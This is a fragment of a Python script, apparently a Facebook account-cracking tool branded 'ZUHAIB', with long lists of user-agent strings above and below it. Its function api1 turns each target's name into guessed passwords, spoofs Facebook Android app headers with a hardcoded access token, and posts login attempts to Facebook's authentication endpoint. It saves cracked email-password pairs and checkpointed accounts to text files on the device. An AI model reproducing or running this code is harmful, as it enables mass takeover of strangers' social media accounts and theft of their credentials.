Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082742113 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3896069416479016690 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082750816 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
"""                
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [\033[1;32mZUHAIB\033[1;37m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ua = '[FBAN/FB4A;FBAV/;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-api.facebook.com/method/auth.login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ZUHAIB-OK] '+ids+' √ '+pas+'\033[1;97m')
                                        open('/sdcard/ZUHAIB-OK.txt','a').write(ids+'√'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;36m[ZUHAIB-2F] '+ids+' ~ '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:                        	
                                        if 'y' in pcp:
                                                print('\r\r\033[1;37m [ZUHAIB-CP] '+ids+' + '+pas+'\033[1;97m')
                                                open('/sdcard/ZUHAIB-CP.txt','a').write(ids+'+'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ZUHAIB-CP.txt','a').write(ids+'+'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
useraggents="""
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3703914388514982487 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1522624600950985189 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082451959 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082454602 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082457257 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7878664985507590752 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3362914098297791158 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872290439 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082465947 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4176339355301370756 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5428479102736810377 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v7863938640015126194 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082475857 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082478499 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v7432867588807617964 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082481149 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872370131 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v80611155147806793 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v5719892281019410869 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2981337680027881500 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4056229610255737633 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082489188 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8539436187412284615 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5077499483376554604 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082499092 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8733830533197110641 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3544777580198539289 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3483695382839825258 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082501740 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7551137255678146520 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082504394 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3245751044627177274 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4746289679026838098 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082513097 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4212140487091043556 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7779851236794268305 t7427258062421531350 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5150601460969254728 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4427398945133467286 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082523009 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872507611 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8512285332675113351 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082525652 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v7249328530779325003 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082528306 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v866780812232829323 t1403586453951734988 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082537005 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872562706 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v2222699493826410550 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8272001410929565910 t1029548762767996041 ath4b3726d5 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082546915 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7610367012364143868 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082549557 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082552212 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9090953937483142692 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4485854093948732177 t5523802693953152063 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7193805918866027805 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1050556486877270663 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082560900 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1379107586794050418 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v6794109624077523058 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872645116 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082570816 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082573458 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082576112 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4255684927586864332 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872700175 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9040300839133573615 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v4277972707488716818 t1737404651745038500 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082584804 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6609560507321070498 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5117391839018038324 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082594714 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082597358 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6481323239287150112 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082600009 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872779872 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4449500601859280519 t4147937780250091430 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v367206437094201971 t5755185651384491427 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 RuxitSynthetic/1.0 v3066835575078036435 t6887521660640726643 ath1fb31b7a altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3266273621406942610 t6553294169466032708 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1250236672198056353 t2855447945163266834 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082608048 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3979041257279714446 t6402838359464213558 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v322668214549461212 t832576955195415109 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4609835013625307970 t5691531456657477892 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082617957 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4646618880322607358 t5648263770542704054 ath2653ab72 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v1101787664153943098 t4803866639546985847 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082620604 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082623256 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v375189948583655177 t7161013424628907418 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082631960 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v611542716886966475 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2915218711252450120 t7427258062421531350 athe94ac249 altpriv cvcv=2 smf=0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3211520740918824077 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2507470025944571643 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v6446432870271605536 t8449228325190938187 ath5ee645e0 altpriv cvcv=2 smf=0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v3082641868 t2317642690233491935 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8872917641 t8617731838935940359 athfa3c3975 altpub cvcv=2 smf=0
